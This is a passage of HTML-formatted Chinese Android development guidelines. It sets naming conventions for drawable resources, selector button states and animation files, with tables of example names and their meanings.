style="font-size: 10pt">&#29992;&#36884;</font></span></font></font><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt">_</font></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><font size="2" style="font-size: 10pt">&#27169;&#22359;&#21517;</font></span></font></font><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt">_</font></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><font size="2" style="font-size: 10pt">&#36923;&#36753;&#21517;&#31216;</font></span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><font size="2" style="font-size: 10pt">&#29992;&#36884;</font></span></font></font><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt">_</font></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><font size="2" style="font-size: 10pt">&#27169;&#22359;&#21517;</font></span></font></font><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt">_</font></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><font size="2" style="font-size: 10pt">&#39068;&#33394;</font></span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><font size="2" style="font-size: 10pt">&#29992;&#36884;</font></span></font></font><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt">_</font></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><font size="2" style="font-size: 10pt">&#36923;&#36753;&#21517;&#31216;</font></span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><font size="2" style="font-size: 10pt">&#29992;&#36884;</font></span></font></font><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt">_</font></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><font size="2" style="font-size: 10pt">&#39068;&#33394;</font></span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#35828;&#26126;&#65306;&#29992;&#36884;&#20063;&#25351;&#25511;&#20214;&#31867;&#22411;&#65288;&#20855;&#20307;&#35265;</span></font></font><font size="3" style="font-size: 12pt">UI</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#25511;&#20214;&#32553;&#20889;&#34920;&#65289;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20363;&#22914;&#65306;</span></font></font><font size="3" style="font-size: 12pt"><br><font face="Courier New, serif"><font size="2" style="font-size: 10pt">btn_main_home.png</font></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#25353;&#38190;</span></font></font><font size="3" style="font-size: 12pt"><br><font face="Courier New, serif"><font size="2" style="font-size: 10pt">divider_maket_white.png</font></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20998;&#21106;&#32447;</span></font></font><font size="3" style="font-size: 12pt"><br><font face="Courier New, serif"><font size="2" style="font-size: 10pt">ic_edit.png</font></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#22270;&#26631;</span></font></font><font size="3" style="font-size: 12pt"><br><font face="Courier New, serif"><font size="2" style="font-size: 10pt">bg_main.png</font></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#32972;&#26223;</span></font></font><font size="3" style="font-size: 12pt"><br><font face="Courier New, serif"><font size="2" style="font-size: 10pt">btn_red.png</font></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#32418;&#33394;&#25353;&#38190;</span></font></font><font size="3" style="font-size: 12pt"><br><font face="Courier New, serif"><font size="2" style="font-size: 10pt">btn_red_big.png</font></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#32418;&#33394;&#22823;&#25353;&#38190;</span></font></font><font size="3" style="font-size: 12pt"><br><font face="Courier New, serif"><font size="2" style="font-size: 10pt">ic_head_small.png</font></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#23567;&#22836;&#20687;</span></font></font><font size="3" style="font-size: 12pt"><br><font face="Courier New, serif"><font size="2" style="font-size: 10pt">bg_input.png</font></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#36755;&#20837;&#26694;&#32972;&#26223;</span></font></font><font size="3" style="font-size: 12pt"><br><font face="Courier New, serif"><font size="2" style="font-size: 10pt">divider_white.png</font></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#30333;&#33394;&#20998;&#21106;&#32447;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#22914;&#26524;&#26377;&#22810;&#31181;&#24418;&#24577;&#22914;&#25353;&#38062;&#31561;&#38500;&#22806;&#22914;</span></font></font><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt">btn_xx.xml</font></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65288;</span></font></font><font size="3" style="font-size: 12pt">selector</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65289;</span></font></font></p><table width="436" cellpadding="1" cellspacing="0"><col width="148"><col width="283"><thead><tr><td width="148" style="border: none; padding: 0in"><p class="western" align="center" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt"><b>&#21517;&#31216;</b></font></span></font></p></td><td width="283" style="border: none; padding: 0in"><p class="western" align="center" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt"><b>&#21151;&#33021;</b></font></span></font></p></td></tr></thead><tbody><tr><td width="148" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">btn_xx</font></font></font></font></p></td><td width="283" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#25353;&#38062;&#22270;&#29255;&#20351;&#29992;</font></span></font><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">btn_</font></font></font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="2" style="font-size: 10pt"><font size="3" style="font-size: 12pt">&#25972;&#20307;&#25928;&#26524;</font></font><font size="3" style="font-size: 12pt">&#65288;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">selector</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#65289;</font></span></font></p></td></tr><tr><td width="148" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">btn_xx_normal</font></font></font></font></p></td><td width="283" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#25353;&#38062;&#22270;&#29255;&#20351;&#29992;</font></span></font><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">btn_</font></font></font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="2" style="font-size: 10pt"><font size="3" style="font-size: 12pt">&#27491;&#24120;&#24773;&#20917;&#25928;&#26524;</font></font><font size="3" style="font-size: 12pt"></font></span></font></p></td></tr><tr><td width="148" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">btn_xx_pressed</font></font></font></font></p></td><td width="283" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#25353;&#38062;&#22270;&#29255;&#20351;&#29992;</font></span></font><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">btn_</font></font></font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="2" style="font-size: 10pt"><font size="3" style="font-size: 12pt">&#28857;&#20987;&#26102;&#20505;&#25928;&#26524;</font></font><font size="3" style="font-size: 12pt"></font></span></font></p></td></tr><tr><td width="148" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">btn_xx_focused</font></font></font></font></p></td><td width="283" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">state_focused</font></font></font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#32858;&#28966;&#25928;&#26524;</font></span></font></p></td></tr><tr><td width="148" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">btn_xx_disabled</font></font></font></font></p></td><td width="283" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">state_enabled</font></font></font></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">(false)</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#19981;&#21487;&#29992;&#25928;&#26524;</font></span></font></p></td></tr><tr><td width="148" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">btn_xx_checked</font></font></font></font></p></td><td width="283" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">state_checked</font></font></font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#36873;&#20013;&#25928;&#26524;</font></span></font></p></td></tr><tr><td width="148" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">btn_xx_selected</font></font></font></font></p></td><td width="283" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">state_selected</font></font></font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#36873;&#20013;&#25928;&#26524;</font></span></font></p></td></tr><tr><td width="148" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">btn_xx_hovered</font></font></font></font></p></td><td width="283" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">state_hovered</font></font></font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#24748;&#20572;&#25928;&#26524;</font></span></font></p></td></tr><tr><td width="148" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">btn_xx_checkable</font></font></font></font></p></td><td width="283" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">state_checkable</font></font></font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#21487;&#36873;&#25928;&#26524;</font></span></font></p></td></tr><tr><td width="148" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">btn_xx_activated</font></font></font></font></p></td><td width="283" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">state_activated</font></font></font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#28608;&#27963;&#30340;</font></span></font></p></td></tr><tr><td width="148" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">btn_xx_windowfocused</font></font></font></font></p></td><td width="283" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">state_window_focused</font></font></font></font></p></td></tr><tr><td width="148" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">bg_head</font></font></font></font></p></td><td width="283" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#32972;&#26223;&#22270;&#29255;&#20351;&#29992;</font></span></font><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">bg_</font></font></font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="2" style="font-size: 10pt"><font size="3" style="font-size: 12pt">&#21151;&#33021;</font></font></span></font><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">_</font></font></font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="2" style="font-size: 10pt"><font size="3" style="font-size: 12pt">&#35828;&#26126;</font></font><font size="3" style="font-size: 12pt"></font></span></font></p></td></tr><tr><td width="148" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">def_search_cell</font></font></font></font></p></td><td width="283" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#40664;&#35748;&#22270;&#29255;&#20351;&#29992;</font></span></font><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">def_</font></font></font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="2" style="font-size: 10pt"><font size="3" style="font-size: 12pt">&#21151;&#33021;</font></font></span></font><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">_</font></font></font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="2" style="font-size: 10pt"><font size="3" style="font-size: 12pt">&#35828;&#26126;</font></font><font size="3" style="font-size: 12pt"></font></span></font></p></td></tr><tr><td width="148" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">ic_more_help</font></font></font></font></p></td><td width="283" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#22270;&#26631;&#22270;&#29255;&#20351;&#29992;</font></span></font><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">ic_</font></font></font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="2" style="font-size: 10pt"><font size="3" style="font-size: 12pt">&#21151;&#33021;</font></font></span></font><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">_</font></font></font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="2" style="font-size: 10pt"><font size="3" style="font-size: 12pt">&#35828;&#26126;</font></font><font size="3" style="font-size: 12pt"></font></span></font></p></td></tr><tr><td width="148" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">seg_list_line</font></font></font></font></p></td><td width="283" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20855;&#26377;&#20998;&#38548;&#29305;&#24449;&#30340;&#22270;&#29255;&#20351;&#29992;</font></span></font><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">seg_</font></font></font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="2" style="font-size: 10pt"><font size="3" style="font-size: 12pt">&#21151;&#33021;</font></font></span></font><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">_</font></font></font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="2" style="font-size: 10pt"><font size="3" style="font-size: 12pt">&#35828;&#26126;</font></font><font size="3" style="font-size: 12pt"></font></span></font></p></td></tr><tr><td width="148" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">sel_ok</font></font></font></font></p></td><td width="283" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#36873;&#25321;&#22270;&#26631;&#20351;&#29992;</font></span></font><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">sel_</font></font></font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="2" style="font-size: 10pt"><font size="3" style="font-size: 12pt">&#21151;&#33021;</font></font></span></font><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">_</font></font></font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="2" style="font-size: 10pt"><font size="3" style="font-size: 12pt">&#35828;&#26126;</font></font><font size="3" style="font-size: 12pt"></font></span></font></p></td></tr></tbody></table><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#27880;&#24847;&#65306;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20351;&#29992;</span></font></font><font size="3" style="font-size: 12pt">AndroidStudio</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#30340;&#25554;&#20214;</span></font></font><font size="3" style="font-size: 12pt">SelectorChapek</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#21487;&#20197;&#24555;&#36895;&#29983;&#25104;</span></font></font><font size="3" style="font-size: 12pt">selector</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#21069;&#25552;&#26159;&#21629;&#21517;&#35201;&#35268;&#33539;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br><em>3.</em></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><em>&#21160;&#30011;&#25991;&#20214;&#65288;</em></span></font></font><font size="3" style="font-size: 12pt"><em>anim</em></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><em>&#25991;&#20214;&#22841;&#19979;&#65289;&#65306;</em></span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20840;&#37096;&#23567;&#20889;&#65292;&#37319;&#29992;&#19979;&#21010;&#32447;&#21629;&#21517;&#27861;&#65292;&#21152;&#21069;&#32512;&#21306;&#20998;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20855;&#20307;&#21160;&#30011;&#37319;&#29992;&#20197;&#19979;&#35268;&#21017;&#65306;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><font size="2" style="font-size: 10pt">&#27169;&#22359;&#21517;</font></span></font></font><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt">_</font></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><font size="2" style="font-size: 10pt">&#36923;&#36753;&#21517;&#31216;</font></span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#36923;&#36753;&#21517;&#31216;</span></font></font><font size="3" style="font-size: 12pt"><br><font face="Courier New, serif"><font size="2" style="font-size: 10pt">refresh_progress.xml</font></font><br><font face="Courier New, serif"><font size="2" style="font-size: 10pt">market_cart_add.xml</font></font><br><font face="Courier New, serif"><font size="2" style="font-size: 10pt">market_cart_remove.xml</font></font><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#26222;&#36890;&#30340;</span></font></font><font size="3" style="font-size: 12pt">tween</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#21160;&#30011;&#37319;&#29992;&#22914;&#19979;&#34920;&#26684;&#20013;&#30340;&#21629;&#21517;&#26041;&#24335;</span></font></font><font size="3" style="font-size: 12pt"><br>//</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#21069;&#38754;&#20026;&#21160;&#30011;&#30340;&#31867;&#22411;&#65292;&#21518;&#38754;&#20026;&#26041;&#21521;</span></font></font></p><table width="237" cellpadding="1" cellspacing="0"><col width="117"><col width="115"><thead><tr><td width="117" style="border: none; padding: 0in"><p class="western" align="center" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt"><b>&#21160;&#30011;&#21629;&#21517;&#20363;&#23376;</b></font></span></font></p></td><td width="115" style="border: none; padding: 0in"><p class="western" align="center" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt"><b>&#35268;&#33539;&#20889;&#27861;</b></font></span></font></p></td></tr></thead><tbody><tr><td width="117" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">fade_in</font></font></font></font></p></td><td width="115" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#28129;&#20837;</font></span></font></p></td></tr><tr><td width="117" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">fade_out</font></font></font></font></p></td><td width="115" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#28129;&#20986;</font></span></font></p></td></tr><tr><td width="117" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">push_down_in</font></font></font></font></p></td><td width="115" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20174;&#19979;&#26041;&#25512;&#20837;</font></span></font></p></td></tr><tr><td width="117" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">push_down_out</font></font></font></font></p></td><td width="115" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20174;&#19979;&#26041;&#25512;&#20986;</font></span></font></p></td></tr><tr><td width="117" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">push_left</font></font></font></font></p></td><td width="115" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#25512;&#21521;&#24038;&#26041;</font></span></font></p></td></tr><tr><td width="117" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">slide_in_from_top</font></font></font></font></p></td><td width="115" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20174;&#22836;&#37096;&#28369;&#21160;&#36827;&#20837;</font></span></font></p></td></tr><tr><td width="117" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">zoom_enter</font></font></font></font></p></td><td width="115" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#21464;&#24418;&#36827;&#20837;</font></span></font></p></td></tr><tr><td width="117" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">slide_in</font></font></font></font></p></td><td width="115" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#28369;&#21160;&#36827;&#20837;</font></span></font></p></td></tr><tr><td width="117" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="Courier New, serif"><font size="2" style="font-size: 10pt"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">shrink_to_middle</font></font></font></font></p></td><td width="115" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20013;&#38388;&#32553;&#23567;</font></span></font></p></td></tr></tbody></table><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font size="3" style="font-size: 12pt"><em>4. values</em></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><em>&#20013;</em></span></font></font><font size="3" style="font-size: 12pt"><em>name</em></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><em>&#21629;&#21517;</em></span></font></font></p><table width="560" cellpadding="1" cellspacing="0"><col width="45"><col width="306"><col width="203"><thead><tr><td width="45" style="border: none; padding: 0in"><p class="western" align="center" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 